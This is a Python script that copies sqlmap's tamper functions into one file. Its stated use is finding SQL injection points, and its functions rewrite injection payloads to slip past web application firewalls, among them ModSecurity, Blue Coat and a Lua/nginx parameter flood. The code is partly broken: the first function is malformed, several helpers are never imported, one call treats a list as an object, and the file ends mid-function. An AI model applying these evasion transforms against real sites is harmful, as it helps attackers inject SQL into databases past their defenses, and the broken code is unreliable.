
#!/usr/bin/env python

# Use Case: Use it when you need to find your injection point using tamper techniques.
# Note: Place this file next to your sqlmap.py.

# Credits: maorsa198@gmail.com.

import os
import re
import sys
import getopt
import random
import string

from lib.core.enums import HINT
from lib.core.compat import xrange
from lib.core.common import randomInt
from lib.core.common import randomRange
from lib.core.datatype import OrderedSet
from lib.core.convert import encodeBase64
from lib.core.settings import DEFAULT_GET_POST_DELIMITER
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS


keywords = [
	"ABSOLUTE",
	"ACTION",
	"ADD",
	"ALL",
	"ALLOCATE",
	"ALTER",
	"AND",
	"ANY",
	"ARE",
	"AS",
	"ASC",
	"ASSERTION",
	"AT",
	"AUTHORIZATION",
	"AVG",
	"BEGIN",
	"BETWEEN",
	"BIT",
	"BIT_LENGTH",
	"BOTH",
	"BY",
	"CALL",
	"CASCADE",
	"CASCADED",
	"CASE",
	"CAST",
	"CATALOG",
	"CHAR",
	"CHAR_LENGTH",
	"CHARACTER",
	"CHARACTER_LENGTH",
	"CHECK",
	"CLOSE",
	"COALESCE",
	"COLLATE",
	"COLLATION",
	"COLUMN",
	"COMMIT",
	"CONDITION",
	"CONNECT",
	"CONNECTION",
	"CONSTRAINT",
	"CONSTRAINTS",
	"CONTAINS",
	"CONTINUE",
	"CONVERT",
	"CORRESPONDING",
	"COUNT",
	"CREATE",
	"CROSS",
	"CURRENT",
	"CURRENT_DATE",
	"CURRENT_PATH",
	"CURRENT_TIME",
	"CURRENT_TIMESTAMP",
	"CURRENT_USER",
	"CURSOR",
	"DATE",
	"DAY",
	"DEALLOCATE",
	"DEC",
	"DECIMAL",
	"DECLARE",
	"DEFAULT",
	"DEFERRABLE",
	"DEFERRED",
	"DELETE",
	"DESC",
	"DESCRIBE",
	"DESCRIPTOR",
	"DETERMINISTIC",
	"DIAGNOSTICS",
	"DISCONNECT",
	"DISTINCT",
	"DO",
	"DOMAIN",
	"DOUBLE",
	"DROP",
	"ELSE",
	"ELSEIF",
	"END",
	"ESCAPE",
	"EXCEPT",
	"EXCEPTION",
	"EXEC",
	"EXECUTE",
	"EXISTS",
	"EXIT",
	"EXTERNAL",
	"EXTRACT",
	"FALSE",
	"FETCH",
	"FIRST",
	"FLOAT",
	"FOR",
	"FOREIGN",
	"FOUND",
	"FROM",
	"FULL",
	"FUNCTION",
	"GET",
	"GLOBAL",
	"GO",
	"GOTO",
	"GRANT",
	"GROUP",
	"HANDLER",
	"HAVING",
	"HOUR",
	"IDENTITY",
	"IF",
	"IMMEDIATE",
	"IN",
	"INDICATOR",
	"INITIALLY",
	"INNER",
	"INOUT",
	"INPUT",
	"INSENSITIVE",
	"INSERT",
	"INT",
	"INTEGER",
	"INTERSECT",
	"INTERVAL",
	"INTO",
	"IS",
	"ISOLATION",
	"JOIN",
	"KEY",
	"LANGUAGE",
	"LAST",
	"LEADING",
	"LEAVE",
	"LEFT",
	"LEVEL",
	"LIKE",
	"LOCAL",
	"LOOP",
	"LOWER",
	"MATCH",
	"MAX",
	"MIN",
	"MINUTE",
	"MODULE",
	"MONTH",
	"NAMES",
	"NATIONAL",
	"NATURAL",
	"NCHAR",
	"NEXT",
	"NO",
	"NOT",
	"NULL",
	"NULLIF",
	"NUMERIC",
	"OCTET_LENGTH",
	"OF",
	"ON",
	"ONLY",
	"OPEN",
	"OPTION",
	"OR",
	"ORDER",
	"OUT",
	"OUTER",
	"OUTPUT",
	"OVERLAPS",
	"PAD",
	"PARAMETER",
	"PARTIAL",
	"PATH",
	"POSITION",
	"PRECISION",
	"PREPARE",
	"PRESERVE",
	"PRIMARY",
	"PRIOR",
	"PRIVILEGES",
	"PROCEDURE",
	"READ",
	"REAL",
	"REFERENCES",
	"RELATIVE",
	"REPEAT",
	"RESIGNAL",
	"RESTRICT",
	"RETURN",
	"RETURNS",
	"REVOKE",
	"RIGHT",
	"ROLLBACK",
	"ROUTINE",
	"ROWS",
	"SCHEMA",
	"SCROLL",
	"SECOND",
	"SECTION",
	"SELECT",
	"SESSION",
	"SESSION_USER",
	"SET",
	"SIGNAL",
	"SIZE",
	"SMALLINT",
	"SOME",
	"SPACE",
	"SPECIFIC",
	"SQL",
	"SQLCODE",
	"SQLERROR",
	"SQLEXCEPTION",
	"SQLSTATE",
	"SQLWARNING",
	"SUBSTRING",
	"SUM",
	"SYSTEM_USER",
	"TABLE",
	"TEMPORARY",
	"THEN",
	"TIME",
	"TIMESTAMP",
	"TIMEZONE_HOUR",
	"TIMEZONE_MINUTE",
	"TO",
	"TRAILING",
	"TRANSACTION",
	"TRANSLATE",
	"TRANSLATION",
	"TRIM",
	"TRUE",
	"UNDO",
	"UNION",
	"UNIQUE",
	"UNKNOWN",
	"UNTIL",
	"UPDATE",
	"UPPER",
	"USAGE",
	"USER",
	"USING",
	"VALUE",
	"VALUES",
	"VARCHAR",
	"VARYING",
	"VIEW",
	"WHEN",
	"WHENEVER",
	"WHERE",
	"WHILE",
	"WITH",
	"WORK",
	"WRITE",
	"YEAR",
	"ZONE",
	"ADD",
	"ALL",
	"ALTER",
	"ANALYZE",
	"AND",
	"ASASC",
	"ASENSITIVE",
	"BEFORE",
	"BETWEEN",
	"BIGINT",
	"BINARYBLOB",
	"BOTH",
	"BY",
	"CALL",
	"CASCADE",
	"CASECHANGE",
	"CAST",
	"CHAR",
	"CHARACTER",
	"CHECK",
	"COLLATE",
	"COLUMN",
	"CONCAT",
	"CONDITIONCONSTRAINT",
	"CONTINUE",
	"CONVERT",
	"CREATE",
	"CROSS",
	"CURRENT_DATE",
	"CURRENT_TIMECURRENT_TIMESTAMP",
	"CURRENT_USER",
	"CURSOR",
	"DATABASE",
	"DATABASES",
	"DAY_HOUR",
	"DAY_MICROSECONDDAY_MINUTE",
	"DAY_SECOND",
	"DEC",
	"DECIMAL",
	"DECLARE",
	"DEFAULTDELAYED",
	"DELETE",
	"DESC",
	"DESCRIBE",
	"DETERMINISTIC",
	"DISTINCTDISTINCTROW",
	"DIV",
	"DOUBLE",
	"DROP",
	"DUAL",
	"EACH",
	"ELSEELSEIF",
	"ENCLOSED",
	"ESCAPED",
	"EXISTS",
	"EXIT",
	"EXPLAIN",
	"FALSEFETCH",
	"FLOAT",
	"FLOAT4",
	"FLOAT8",
	"FOR",
	"FORCE",
	"FOREIGNFROM",
	"FULLTEXT",
	"GRANT",
	"GROUP",
	"HAVING",
	"HIGH_PRIORITYHOUR_MICROSECOND",
	"HOUR_MINUTE",
	"HOUR_SECOND",
	"IF",
	"IFNULL",
	"IGNORE",
	"ININDEX",
	"INFILE",
	"INNER",
	"INOUT",
	"INSENSITIVE",
	"INSERT",
	"INTINT1",
	"INT2",
	"INT3",
	"INT4",
	"INT8",
	"INTEGER",
	"INTERVALINTO",
	"IS",
	"ISNULL",
	"ITERATE",
	"JOIN",
	"KEY",
	"KEYS",
	"KILLLEADING",
	"LEAVE",
	"LEFT",
	"LIKE",
	"LIMIT",
	"LINESLOAD",
	"LOCALTIME",
	"LOCALTIMESTAMP",
	"LOCK",
	"LONG",
	"LONGBLOBLONGTEXT",
	"LOOP",
	"LOW_PRIORITY",
	"MATCH",
	"MEDIUMBLOB",
	"MEDIUMINT",
	"MEDIUMTEXTMIDDLEINT",
	"MINUTE_MICROSECOND",
	"MINUTE_SECOND",
	"MOD",
	"MODIFIES",
	"NATURAL",
	"NOTNO_WRITE_TO_BINLOG",
	"NULL",
	"NUMERIC",
	"ON",
	"OPTIMIZE",
	"OPTION",
	"OPTIONALLYOR",
	"ORDER",
	"OUT",
	"OUTER",
	"OUTFILE",
	"PRECISIONPRIMARY",
	"PROCEDURE",
	"PURGE",
	"READ",
	"READS",
	"REALREFERENCES",
	"REGEXP",
	"RELEASE",
	"RENAME",
	"REPEAT",
	"REPLACE",
	"REQUIRERESTRICT",
	"RETURN",
	"REVOKE",
	"RIGHT",
	"RLIKE",
	"SCHEMA",
	"SCHEMASSECOND_MICROSECOND",
	"SELECT",
	"SENSITIVE",
	"SEPARATOR",
	"SET",
	"SHOW",
	"SMALLINTSONAME",
	"SPATIAL",
	"SPECIFIC",
	"SQL",
	"SQLEXCEPTION",
	"SQLSTATESQLWARNING",
	"SQL_BIG_RESULT",
	"SQL_CALC_FOUND_ROWS",
	"SQL_SMALL_RESULT",
	"SSL",
	"STARTINGSTRAIGHT_JOIN",
	"TABLE",
	"TERMINATED",
	"THEN",
	"TINYBLOB",
	"TINYINT",
	"TINYTEXTTO",
	"TRAILING",
	"TRIGGER",
	"TRUE",
	"UNDO",
	"UNION",
	"UNIQUEUNLOCK",
	"UNSIGNED",
	"UPDATE",
	"USAGE",
	"USE",
	"USING",
	"UTC_DATEUTC_TIME",
	"UTC_TIMESTAMP",
	"VALUES",
	"VARBINARY",
	"VARCHAR",
	"VARCHARACTERVARYING",
	"VERSION",
	"WHEN",
	"WHERE",
	"WHILE",
	"WITH",
	"WRITEXOR",
	"YEAR_MONTH",
	"ZEROFILL"
]

def tamper(payload, **kwargs):
"""
Replace OR and AND keywords with || and &&
>>> tamper(' or 1=1#)
' || or 1=1#
"""
retVal = ""
retVal = re.sub('\\bOR\\b', '||', payload)
retVal = re.sub('\\bAND\\b', '&&', retVal)
    return retVal

def tamper_0eunion(payload, **kwargs):
    return re.sub(r"(?i)(\d+)\s+(UNION )", r"\g<1>e0\g<2>", payload) if payload else payload
    
def tamper_apostrophemask(payload, **kwargs):
    return payload.replace('\'', "%EF%BC%87") if payload else payload

def tamper_apostrophenullencode(payload, **kwargs):
    return payload.replace('\'', "%00%27") if payload else payload

def tamper_appendnullbyte(payload, **kwargs):
    return "%s%%00" % payload if payload else payload

def tamper_base64encode(payload, **kwargs):
    return encodeBase64(payload, binary=False) if payload else payload

def tamper_between(payload, **kwargs):
    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

        if match:
            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)

        if retVal == payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*", payload)

            if match:
                _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                retVal = retVal.replace(match.group(0), _)

    return retVal

def tamper_binary(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = re.sub(r"\bNULL\b", "binary NULL", retVal)
        retVal = re.sub(r"\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)", r"\g<1>binary \g<2>\g<3>binary \g<4>", retVal)
        retVal = re.sub(r"(\d+\s*[>=]\s*)(\d+)", r"binary \g<1>binary \g<2>", retVal)
        retVal = re.sub(r"\b((AND|OR)\s*)(\d+)", r"\g<1>binary \g<3>", retVal)
        retVal = re.sub(r"([>=]\s*)(\d+)", r"\g<1>binary \g<2>", retVal)
        retVal = re.sub(r"\b(0x[0-9a-f]+)", r"binary \g<1>", retVal)
        retVal = re.sub(r"(\s+binary)+", r"\g<1>", retVal)

    return retVal

def tamper_bluecoat(payload, **kwargs):
    
    def process(match):
        word = match.group('word')
        if word.upper() in keywords:
            return match.group().replace(word, "%s%%09" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"\b(?P<word>[A-Z_]+)(?=[^\w(]|\Z)", process, retVal)
        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
        retVal = retVal.replace("%09 ", "%09")

    return retVal

def tamper_chardoubleencode(payload, **kwargs):
    
    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += '%%25%s' % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%25%.2X' % ord(payload[i])
                i += 1

    return retVal

def tamper_charencode(payload, **kwargs):
    
    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            else:
                retVal += '%%%.2X' % ord(payload[i])
                i += 1

    return retVal

def tamper_charunicodeencode(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "%%u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%u%.4X' % ord(payload[i])
                i += 1

    return retVal

def tamper_charunicodeescape(payload, **kwargs):
    
    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "\\u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '\\u%.4X' % ord(payload[i])
                i += 1

    return retVal

def tamper_commalesslimit(payload, **kwargs):
    
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal

def tamper_commalessmid(payload, **kwargs):
    
    retVal = payload

    warnMsg = "you should consider usage of switch '--no-cast' along with "
    warnMsg += "tamper script '%s'" % os.path.basename(__file__).split(".")[0]
    singleTimeWarnMessage(warnMsg)

    match = re.search(r"(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "MID(%s FROM %s FOR %s)" % (match.group(1), match.group(2), match.group(3)))

    return retVal

def tamper_commentbeforeparentheses(payload, **kwargs):
    
    retVal = payload

    if payload:
        retVal = re.sub(r"\b(\w+)\(", r"\g<1>/**/(", retVal)

    return retVal

def tamper_concat2concatws(payload, **kwargs):
    
    if payload:
        payload = payload.replace("CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")

    return payload

def tamper_dunion(payload, **kwargs):

    return re.sub(r"(?i)(\d+)\s+(UNION )", r"\g<1>D\g<2>", payload) if payload else payload

def tamper_equaltolike(payload, **kwargs):
    
    retVal = payload

    if payload:
        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)

    return retVal

def tamper_equaltorlike(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = re.sub(r"\s*=\s*", " RLIKE ", retVal)

    return retVal

def tamper_escapequotes(payload, **kwargs):
    
    return payload.replace("'", "\\'").replace('"', '\\"')

def tamper_greatest(payload, **kwargs):
   
    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)

        if match:
            _ = "%sGREATEST(%s,%s+1)=%s" % (match.group(1), match.group(3), match.group(4), match.group(3))
            retVal = retVal.replace(match.group(0), _)

    return retVal

def tamper_halfversionedmorekeywords(payload, **kwargs):
    
    def process(match):
        word = match.group('word')
        if word.upper() in keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!0%s" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        retVal = retVal.replace(" /*!0", "/*!0")

    return retVal

def tamper_hex2char(payload, **kwargs):
    
    retVal = payload

    if payload:
        for match in re.finditer(r"\b0x([0-9a-f]+)\b", retVal):
            if len(match.group(1)) > 2:
                result = "CONCAT(%s)" % ','.join("CHAR(%d)" % _ for _ in getOrds(decodeHex(match.group(1))))
            else:
                result = "CHAR(%d)" % ord(decodeHex(match.group(1)))
            retVal = retVal.replace(match.group(0), result)

    return retVal
    
def tamper_htmlencode(payload, **kwargs):
    
    return re.sub(r"[^\w]", lambda match: "&#%d;" % ord(match.group(0)), payload) if payload else payload

def tamper_ifnull2casewhenisnull(payload, **kwargs):

    if payload and payload.find("IFNULL") > -1:
        while payload.find("IFNULL(") > -1:
            index = payload.find("IFNULL(")
            depth = 1
            comma, end = None, None

            for i in xrange(index + len("IFNULL("), len(payload)):
                if depth == 1 and payload[i] == ',':
                    comma = i

                elif depth == 1 and payload[i] == ')':
                    end = i
                    break

                elif payload[i] == '(':
                    depth += 1

                elif payload[i] == ')':
                    depth -= 1

            if comma and end:
                _ = payload[index + len("IFNULL("):comma]
                __ = payload[comma + 1:end].lstrip()
                newVal = "CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END" % (_, __, _)
                payload = payload[:index] + newVal + payload[end + 1:]
            else:
                break

    return payload

def tamper_ifnull2ifisnull(payload, **kwargs):
    
    if payload and payload.find("IFNULL") > -1:
        while payload.find("IFNULL(") > -1:
            index = payload.find("IFNULL(")
            depth = 1
            comma, end = None, None

            for i in xrange(index + len("IFNULL("), len(payload)):
                if depth == 1 and payload[i] == ',':
                    comma = i

                elif depth == 1 and payload[i] == ')':
                    end = i
                    break

                elif payload[i] == '(':
                    depth += 1

                elif payload[i] == ')':
                    depth -= 1

            if comma and end:
                _ = payload[index + len("IFNULL("):comma]
                __ = payload[comma + 1:end].lstrip()
                newVal = "IF(ISNULL(%s),%s,%s)" % (_, __, _)
                payload = payload[:index] + newVal + payload[end + 1:]
            else:
                break

    return payload

def tamper_informationschemacomment(payload, **kwargs):
   
    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)(information_schema)\.", r"\g<1>/**/.", payload)

    return retVal


def tamper_least(payload, **kwargs):
    
    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)

        if match:
            _ = "%sLEAST(%s,%s+1)=%s+1" % (match.group(1), match.group(3), match.group(4), match.group(4))
            retVal = retVal.replace(match.group(0), _)

    return retVal

def tamper_lowercase(payload, **kwargs):
    
    retVal = payload

    if payload:
        for match in re.finditer(r"\b[A-Za-z_]+\b", retVal):
            word = match.group()

            if word.upper() in keywords:
                retVal = retVal.replace(word, word.lower())

    return retVal


def tamper_luanginx(payload, **kwargs):

    hints = kwargs.get("hints", {})
    delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)

    hints[HINT.PREPEND] = delimiter.join("%s=" % "".join(random.sample(string.ascii_letters + string.digits, 2)) for _ in xrange(500))

    return payload

def tamper_misunion(payload, **kwargs):

    return re.sub(r"(?i)\s+(UNION )", r"-.1\g<1>", payload) if payload else payload

def tamper_modsecurityversioned(payload, **kwargs):

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!30%s%s*/%s" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)

    return retVal

def tamper_modsecurityzeroversioned(payload, **kwargs):

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!00000%s*/%s" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)

    return retVal

def tamper_multiplespaces(payload, **kwargs):

    retVal = payload

    if payload:
        words = OrderedSet()

        for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
            word = match.group()

            if word.upper() in keywords:
                words.add(word)

        for word in words:
            retVal = re.sub(r"(?<=\W)%s(?=[^A-Za-z_(]|\Z)" % word, "%s%s%s" % (' ' * random.randint(1, 4), word, ' ' * random.randint(1, 4)), retVal)
            retVal = re.sub(r"(?<=\W)%s(?=[(])" % word, "%s%s" % (' ' * random.randint(1, 4), word), retVal)

    return retVal

def tamper_overlongutf8more(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            else:
                retVal += "%%%.2X%%%.2X" % (0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))
                i += 1

    return retVal

def tamper_overlongutf8(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            else:
                if payload[i] not in (string.ascii_letters + string.digits):
                    retVal += "%%%.2X%%%.2X" % (0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))
                else:
                    retVal += payload[i]
                i += 1

    return retVal

def tamper_percentage(payload, **kwargs):

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            elif payload[i] != ' ':
                retVal += '%%%s' % payload[i]
                i += 1
            else:
                retVal += payload[i]
                i += 1

    return retVal

def tamper_plus2concat(payload, **kwargs):

    retVal = payload

    if payload:
        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
        if match:
            part = match.group(0)

            chars = [char for char in part]
            for index in zeroDepthSearch(part, '+'):
                chars[index] = ','

            replacement = "CONCAT(%s)" % "".join(chars)
            retVal = retVal.replace(part, replacement)

    return retVal

def tamper_plus2fnconcat(payload, **kwargs):

    retVal = payload

    if payload:
        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
        if match:
            old = match.group(0)
            parts = []
            last = 0

            for index in zeroDepthSearch(old, '+'):
                parts.append(old[last:index].strip('+'))
                last = index

            parts.append(old[last:].strip('+'))
            replacement = parts[0]

            for i in xrange(1, len(parts)):
                replacement = "{fn CONCAT(%s,%s)}" % (replacement, parts[i])

            retVal = retVal.replace(old, replacement)

    return retVal

def tamper_randomcase(payload, **kwargs):

    retVal = payload

    if payload:
        for match in re.finditer(r"\b[A-Za-z_]{2,}\b", retVal):
            word = match.group()

            if (word.upper() in keywords and re.search(r"(?i)[`\"'\[]%s[`\"'\]]" % word, retVal) is None) or ("%s(" % word) in payload:
                while True:
                    _ = ""

                    for i in xrange(len(word)):
                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()

                    if len(_) > 1 and _ not in (_.lower(), _.upper()):
                        break

                retVal = retVal.replace(word, _)

    return retVal

def tamper_randomcomments(payload, **kwargs):

    retVal = payload

    if payload:
        for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
            word = match.group()

            if len(word) < 2:
                continue

            if word.upper() in keywords:
                _ = word[0]

                for i in xrange(1, len(word) - 1):
                    _ += "%s%s" % ("/**/" if randomRange(0, 1) else "", word[i])

                _ += word[-1]

                if "/**/" not in _:
                    index = randomRange(1, len(word) - 1)
                    _ = word[:index] + "/**/" + word[index:]

                retVal = retVal.replace(word, _)

    return retVal

def tamper_schemasplit(payload, **kwargs):

    return re.sub(r"(?i)( FROM \w+)\.(\w+)", r"\g<1> 9.e.\g<2>", payload) if payload else payload

def tamper_sleep2getlock(payload, **kwargs):

    if payload:
        payload = payload.replace("SLEEP(", "GET_LOCK('%s'," % keywords.aliasName)

    return payload

def tamper_space2comment(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]

    return retVal

def tamper_space2dash(payload, **kwargs):

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "--%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal

def tamper_space2hash(payload, **kwargs):

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal

def tamper_space2morecomment(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**_**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**_**/"
                continue

            retVal += payload[i]

    return retVal

def tamper_space2morehash(payload, **kwargs):

    def process(match):
        word = match.group('word')
        randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))

        if word.upper() in keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "%s%%23%s%%0A" % (word, randomStr))
        else:
            return match.group()

    retVal = ""

    if payload:
        payload = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, payload)

        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "%%23%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal

def tamper_space2mssqlblank(payload, **kwargs):

    blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True

            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += random.choice(blanks[:-1])
                else:
                    retVal += random.choice(blanks)

                continue

            retVal += payload[i]

    return retVal

def tamper_space2mssqlhash(payload, **kwargs):

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                retVal += "%23%0A"
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal

def tamper_space2mysqlblank(payload, **kwargs):

    blanks = ('%09', '%0A', '%0C', '%0D', '%0B', '%A0')
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += random.choice(blanks)
                continue

            retVal += payload[i]

    return retVal

def tamper_space2mysqldash(payload, **kwargs):

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                retVal += "--%0A"
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal

def tamper_space2plus(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "+"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "+"
                continue

            retVal += payload[i]

    return retVal

def tamper_space2randomblank(payload, **kwargs):

    blanks = ("%09", "%0A", "%0C", "%0D")
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == ' ' and not doublequote and not quote:
                retVal += random.choice(blanks)
                continue

            retVal += payload[i]

    return retVal

def tamper_sp_password(payload, **kwargs):

    retVal = ""

    if payload:
        retVal = "%s%ssp_password" % (payload, "-- " if not any(_ if _ in payload else None for _ in ('#', "-- ")) else "")

    return retVal

def tamper_substring2leftright(payload, **kwargs):

    retVal = payload

    if payload:
        match = re.search(r"SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)", payload)

        if match:
            pos = int(match.group(2))
            if pos == 1:
